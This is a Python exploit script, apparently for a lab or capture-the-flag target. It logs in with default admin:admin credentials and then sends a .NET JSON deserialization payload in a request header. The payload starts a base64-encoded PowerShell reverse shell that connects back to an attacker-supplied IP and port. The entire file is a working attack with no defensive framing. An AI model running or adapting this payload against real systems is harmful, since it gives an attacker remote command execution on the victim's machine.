#!/usr/bin/python3
# Creator: brutuspt

import requests
import argparse
import os, sys
import base64
import json


parser = argparse.ArgumentParser(description='Process some integers.')
parser.add_argument("-t", "--target", help="Target Domain Name/IP", required=True)
parser.add_argument("-i", "--IP", help="Attacker IP (Where to catch the rev shell)", required=True)
parser.add_argument("-p", "--port", help="Attacker Port (Where to catch the rev shell)", required=True)


args = parser.parse_args()

s = requests.Session()


#login function
def login(target):
	url = "http://%s/api/token" % target

	data = { "UserName" : "admin", "Password" : "admin" }
	#proxies = { "http" : "127.0.0.1:8080" }

	#s = requests.Session()
	r = s.post(url, json=data) # proxies=proxies

	if r.status_code == 202:
		print("[INFO] Login using admin:admin was successful!")
	else:
		print("[ERROR] Login Failed!")
		sys.exit(1)

def cereal_exploit(target, ip, port):

    payload = '$client = New-Object System.Net.Sockets.TCPClient("%s",%s);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
    payload = payload % (ip, port)
    base64_payload = base64.b64encode(payload.encode('utf16')[2:]).decode()
    
    payload_cereal = {
    '$type':'System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35',
    'MethodName':'Start',
    'MethodParameters':{
        '$type':'System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089',
        '$values':['cmd', '/c powershell.exe -e ']
    },
    'ObjectInstance':{'$type':'System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089'}
    }


    payload_cereal['MethodParameters']['$values'][1] = '/c powershell.exe -e ' + str(base64_payload)
    
    print("[INFO] Preparing the .NET Deserialization payload with a Powershell reverse shell...")

    # base64 deserialization payload, which contains a powershell base64 encoded one-liner rev shell
    cereal64 = base64.urlsafe_b64encode(json.dumps(payload_cereal).encode()).decode()

    url = "http://%s/api/Account" % target
    #proxies = { "http" : "127.0.0.1:8080" }
    headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0",
        "Bearer" : cereal64
    }
    r = s.get(url, headers=headers) #proxies=proxies
    print("[INFO] Payload sent, check your callback at " + str(ip) + ":" + str(port) + " ;)")


def main():
    login(args.target)
    cereal_exploit(args.target, args.IP, args.port)


if __name__ == "__main__":
    main()
